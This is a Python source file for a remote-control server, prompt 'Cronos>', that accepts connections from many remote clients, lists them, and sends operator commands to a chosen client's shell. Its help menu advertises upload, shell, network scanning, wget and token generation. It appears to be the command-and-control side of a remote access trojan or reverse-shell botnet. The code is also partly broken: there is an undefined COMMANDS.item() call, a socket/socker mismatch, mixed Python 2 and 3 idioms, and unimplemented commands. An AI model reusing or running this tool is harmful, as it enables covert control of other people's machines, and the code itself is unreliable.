#!/usr/bin/Python2.7.12
from var import *
import socket
import threading
import time
import sys
import requests
from multiprocessing import Queue
from Queue import Queue
import struct
import signal

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
QUEUE = Queue()

port = int(server_port)

HELP = {'help':["Shows the help menu"],
        'client':["Selects a client by the UID number (token)"],
        'clients':["Shows the entire list of clients"],
        'upload':["Uploads file"],
        'shell':["Open shell and execute commands"],
        'exit':["Exit the server and keep all clients alive"],
        'end':["Kill current connection"],
        'kill':["Kill all active connections"],
        'scan':["Scan the network"],
        'system':["Shows all current system info"],
        'wget':["Download file from web"],
        'crypt':["Generate crypto token"],
        }

class MultiServer(object):

    def __init__(self):
        self.host = host
        self.port = port
        self.socker = None
        self.all_connections = []
        self.all_addresses = []

    def help(self):
        for cmd, v in COMMANDS.item():
            print("{0}:\t{1}".format(cmd, v[0]))
        return

    def register_signal_handler(self):
        signal.signal(signal.SIGINT, self.quit_gracefully)
        signal.signal(signal.SIGTERM, self.quit_gracefully)
        return

    def quit_gracefully(self, signal=None, frame=None):
        print('\nQuitting gracefully')
        for conn in self.all_connections:
            try:
                conn.shutdown(2)
                conn.close()
            except Exception as e:
                print('Could not close connection %s' % str(e))
                # continue
        self.socket.close()
        sys.exit(0)

    def socket_create(self):
        try:
            self.socket = socket.socket()
        except socket.error as msg:
            print("Socket creation error: " + str(msg))
            # TODO: Added exit
            sys.exit(1)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        return

    def socket_bind(self):
        """ Bind socket to port and wait for connection from client """
        try:
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
        except socket.error as e:
            print("Socket binding error: " + str(e))
            time.sleep(5)
            self.socket_bind()
        return

    def accept_connections(self):
        """ Accept connections from multiple clients and save to list """
        for c in self.all_connections:
            c.close()
        self.all_connections = []
        self.all_addresses = []
        while 1:
            try:
                conn, address = self.socket.accept()
                conn.setblocking(1)
                client_hostname = conn.recv(1024).decode("utf-8")
                address = address + (client_hostname,)
            except Exception as e:
                print('Error accepting connections: %s' % str(e))
                # Loop indefinitely
                continue
            self.all_connections.append(conn)
            self.all_addresses.append(address)
            print('\nConnection has been established: {0} ({1})'.format(address[-1], address[0]))
        return

    def start_server(self):
        """ Interactive prompt for sending commands remotely """
        while True:
            cmd = input('Cronos> ')
            if cmd == 'clients':
                self.list_connections()
                continue
            elif 'client' in cmd:
                target, conn = self.get_target(cmd)
                if conn is not None:
                    self.send_target_commands(target, conn)
            elif cmd == 'shutdown':
                    QUEUE.task_done()
                    QUEUE.task_done()
                    print('Server shutdown')
                    #self.quit_gracefully()
                    break
                    # self.quit_gracefully()
            elif cmd == 'help':
                self.help()
            elif cmd == '':
                pass
            else:
                print('Command not recognized')
        return

    def list_connections(self):
        """ List all clients connected """
        results = ''
        for i, conn in enumerate(self.all_connections):
            try:
                conn.send(str.encode(' '))
                conn.recv(20480)
            except:
                del self.all_connections[i]
                del self.all_addresses[i]
                continue
            results += str(i) + '   ' + str(self.all_addresses[i][0]) + '   ' + str(
                self.all_addresses[i][1]) + '   ' + str(self.all_addresses[i][2]) + '\n'
        print('----- Clients -----' + '\n' + results)
        return

    def get_target(self, cmd):
        """ Select target client
        :param cmd:
        """
        target = cmd.split(' ')[-1]
        try:
            target = int(target)
        except:
            print('Client index should be an integer')
            return None, None
        try:
            conn = self.all_connections[target]
        except IndexError:
            print('Not a valid selection')
            return None, None
        print("You are now connected to " + str(self.all_addresses[target][2]))
        return target, conn

    def read_command_output(self, conn):
        """ Read message length and unpack it into an integer
        :param conn:
        """
        raw_msglen = self.recvall(conn, 4)
        if not raw_msglen:
            return None
        msglen = struct.unpack('>I', raw_msglen)[0]
        # Read the message data
        return self.recvall(conn, msglen)

    def recvall(self, conn, n):
        """ Helper function to recv n bytes or return None if EOF is hit
        :param n:
        :param conn:
        """
        # TODO: this can be a static method
        data = b''
        while len(data) < n:
            packet = conn.recv(n - len(data))
            if not packet:
                return None
            data += packet
        return data

    def send_target_commands(self, target, conn):
        """ Connect with remote target client
        :param conn:
        :param target:
        """
        conn.send(str.encode(" "))
        cwd_bytes = self.read_command_output(conn)
        cwd = str(cwd_bytes, "utf-8")
        #print(cwd, end="")
        print(cwd)
        while True:
            try:
                cmd = input()
                if len(str.encode(cmd)) > 0:
                    conn.send(str.encode(cmd))
                    cmd_output = self.read_command_output(conn)
                    client_response = str(cmd_output, "utf-8")
                    #print(client_response, end="")
                    print(client_response)
                if cmd == 'quit':
                    break
            except Exception as e:
                print("Connection was lost %s" %str(e))
                break
        del self.all_connections[target]
        del self.all_addresses[target]
        return


def create_workers():
    """ Create worker threads (will die when main exits) """
    server = MultiServer()
    server.register_signal_handler()
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work, args=(server,))
        t.daemon = True
        t.start()
    return


def work(server):
    """ Do the next job in the QUEUE (thread for handling connections, another for sending commands)
    :param server:
    """
    while True:
        x = QUEUE.get()
        if x == 1:
            server.socket_create()
            server.socket_bind()
            server.accept_connections()
        if x == 2:
            server.start_server()
        QUEUE.task_done()
    return

def create_jobs():
    """ Each list item is a new job """
    for x in JOB_NUMBER:
        QUEUE.put(x)
    QUEUE.join()
    return

def main():
    create_workers()
    create_jobs()


if __name__ == '__main__':
    main()
